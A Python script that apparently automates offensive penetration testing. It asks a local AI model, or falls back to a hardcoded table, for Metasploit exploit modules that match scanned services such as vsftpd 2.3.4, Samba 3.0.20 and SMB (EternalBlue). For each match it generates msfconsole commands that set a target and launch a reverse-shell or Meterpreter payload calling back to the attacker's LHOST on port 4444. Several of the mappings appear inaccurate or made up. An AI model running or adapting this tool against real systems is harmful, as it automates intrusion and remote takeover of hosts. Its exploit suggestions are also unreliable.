#!/usr/bin/env python3
"""
Enhanced Metasploit Exploit Finder with Local AI (Ollama)
Finds relevant Metasploit exploits for discovered services using local AI models
"""

import os
import sys
import json
from typing import Dict, Any, List, Optional

# Add the path to import local_ai_system
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, current_dir)

try:
    from local_ai_system import local_ai
    LOCAL_AI_AVAILABLE = True
    print("ü§ñ Local AI system loaded successfully")
except ImportError as e:
    print(f"‚ö†Ô∏è Local AI not available: {e}")
    LOCAL_AI_AVAILABLE = False


def find_metasploit_exploit(service_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    Find Metasploit exploit using local AI models
    
    Args:
        service_data: Dictionary containing service information
        
    Returns:
        Dictionary with exploit module, payload, and commands
    """
    
    service = service_data.get('service', 'unknown')
    product = service_data.get('product', 'unknown')
    version = service_data.get('version', 'unknown')
    port = service_data.get('port', 'unknown')
    host = service_data.get('host', service_data.get('ip', 'unknown'))
    
    print(f"üîç Finding exploit for: {service} {product} {version} (Port {port})")
    
    # Try local AI first
    if LOCAL_AI_AVAILABLE:
        try:
            # Reduced logging for large batches
            result = local_ai.generate_metasploit_exploit(service_data)
            
            if result and not result.get('error'):
                # Only log success briefly
                return result
            else:
                print(f"‚ö†Ô∏è Local AI failed: {result.get('error', 'Unknown error')}")
                
        except Exception as e:
            print(f"‚ùå Local AI error: {e}")
    
    # Fallback to rule-based matching
    return get_fallback_exploit(service_data)


def get_fallback_exploit(service_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    Fallback function with hardcoded exploit mappings
    """
    
    service = service_data.get('service', '').lower()
    product = service_data.get('product', '').lower()
    version = service_data.get('version', '').lower()
    port = service_data.get('port', 0)
    host = service_data.get('host', service_data.get('ip', 'TARGET_IP'))
    
    # Known exploit mappings
    exploit_mappings = {
        # FTP Services
        ('ftp', 'vsftpd', '2.3.4'): {
            'exploit_module': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'payload': 'payload/cmd/unix/interact',
            'reasoning': 'vsftpd 2.3.4 contains a backdoor vulnerability'
        },
        ('ftp', 'proftpd', '1.3.0'): {
            'exploit_module': 'exploit/linux/ftp/proftp_sreplace',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'reasoning': 'ProFTPD 1.3.0 vulnerable to sreplace buffer overflow'
        },
        
        # SSH Services  
        ('ssh', 'openssh', '2.3'): {
            'exploit_module': 'exploit/linux/ssh/openssh_useradd',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'reasoning': 'OpenSSH 2.3 vulnerable to useradd exploit'
        },
        
        # Samba Services
        ('netbios-ssn', 'samba', '3.0.20'): {
            'exploit_module': 'exploit/linux/samba/lsa_transnames_heap',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'reasoning': 'Samba 3.0.20 LSA transnames heap overflow'
        },
        ('microsoft-ds', 'samba', '3.0.20'): {
            'exploit_module': 'exploit/linux/samba/lsa_transnames_heap',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'reasoning': 'Samba 3.0.20 LSA transnames heap overflow'
        },
        
        # HTTP Services
        ('http', 'apache', '2.2'): {
            'exploit_module': 'exploit/linux/http/apache_mod_rewrite_ldap',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'reasoning': 'Apache 2.2.x mod_rewrite LDAP vulnerability'
        },
        
        # Database Services
        ('mysql', 'mysql', '5.'): {
            'exploit_module': 'exploit/linux/mysql/mysql_yassl_hello',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'reasoning': 'MySQL 5.x yaSSL buffer overflow'
        },
        
        # SMB Services (Windows)
        ('microsoft-ds', 'microsoft', ''): {
            'exploit_module': 'exploit/windows/smb/ms17_010_eternalblue',
            'payload': 'payload/windows/x64/meterpreter/reverse_tcp',
            'reasoning': 'EternalBlue SMB vulnerability (MS17-010)'
        },
        
        # Telnet Services
        ('telnet', '', ''): {
            'exploit_module': 'exploit/linux/telnet/telnet_encrypt_keyid',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'reasoning': 'Generic telnet vulnerability'
        }
    }
    
    # Try to find exact match
    for (srv, prod, ver), exploit_info in exploit_mappings.items():
        if (srv in service and 
            (not prod or prod in product) and 
            (not ver or ver in version)):
            
            exploit_module = exploit_info['exploit_module']
            payload = exploit_info['payload']
            reasoning = exploit_info['reasoning']
            
            commands = [
                f"use {exploit_module}",
                f"set RHOSTS {host}",
                f"set RPORT {port}",
                f"set payload {payload}",
                "set LHOST YOUR_IP",
                "set LPORT 4444",
                "check",
                "exploit"
            ]
            
            print(f"‚úÖ Fallback match: {exploit_module}")
            
            return {
                'exploit_module': exploit_module,
                'payload': payload,
                'confidence': 'medium',
                'reasoning': reasoning,
                'target_info': {
                    'RHOSTS': host,
                    'RPORT': port
                },
                'commands': commands,
                'ai_source': 'fallback_rules'
            }
    
    # Default fallback
    print("‚ö†Ô∏è No specific exploit found, using generic handler")
    
    return {
        'exploit_module': 'exploit/multi/handler',
        'payload': 'payload/generic/shell_reverse_tcp',
        'confidence': 'low',
        'reasoning': 'No specific exploit found for this service',
        'target_info': {
            'RHOSTS': host,
            'RPORT': port
        },
        'commands': [
            'use exploit/multi/handler',
            'set payload payload/generic/shell_reverse_tcp',
            f'set RHOSTS {host}',
            'set LHOST YOUR_IP',
            'set LPORT 4444',
            'exploit'
        ],
        'ai_source': 'generic_fallback'
    }


def analyze_exploits_with_ai(exploits_data: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Analyze multiple exploits and add AI suggestions
    """
    
    if not LOCAL_AI_AVAILABLE:
        print("‚ö†Ô∏è Local AI not available for exploit analysis")
        return exploits_data
    
    enhanced_exploits = []
    
    for exploit_data in exploits_data:
        try:
            # Extract service information
            service_info = {
                'service': exploit_data.get('service', 'unknown'),
                'product': exploit_data.get('product', 'unknown'),  
                'version': exploit_data.get('version', 'unknown'),
                'port': exploit_data.get('port', 'unknown'),
                'host': exploit_data.get('host', exploit_data.get('ip', 'unknown'))
            }
            
            # Get AI suggestion
            ai_suggestion = find_metasploit_exploit(service_info)
            
            # Add AI suggestion to exploit data
            exploit_data['ai_suggestion'] = ai_suggestion
            enhanced_exploits.append(exploit_data)
            
        except Exception as e:
            print(f"‚ùå Error analyzing exploit: {e}")
            exploit_data['ai_suggestion'] = {'error': str(e)}
            enhanced_exploits.append(exploit_data)
    
    return enhanced_exploits


# Test function
def test_exploit_finder():
    """Test the exploit finder with sample data"""
    
    test_cases = [
        {
            'service': 'ftp',
            'product': 'vsftpd', 
            'version': '2.3.4',
            'port': 21,
            'host': '192.168.1.100'
        },
        {
            'service': 'ssh',
            'product': 'openssh',
            'version': '7.4',
            'port': 22,
            'host': '192.168.1.100'
        },
        {
            'service': 'http',
            'product': 'apache',
            'version': '2.2.8',
            'port': 80,
            'host': '192.168.1.100'
        }
    ]
    
    print("üß™ Testing exploit finder...")
    
    for i, test_case in enumerate(test_cases, 1):
        print(f"\n--- Test Case {i} ---")
        result = find_metasploit_exploit(test_case)
        print(f"Result: {result.get('exploit_module', 'None')}")
        print(f"Confidence: {result.get('confidence', 'Unknown')}")
        print(f"Source: {result.get('ai_source', 'Unknown')}")


if __name__ == "__main__":
    test_exploit_finder()
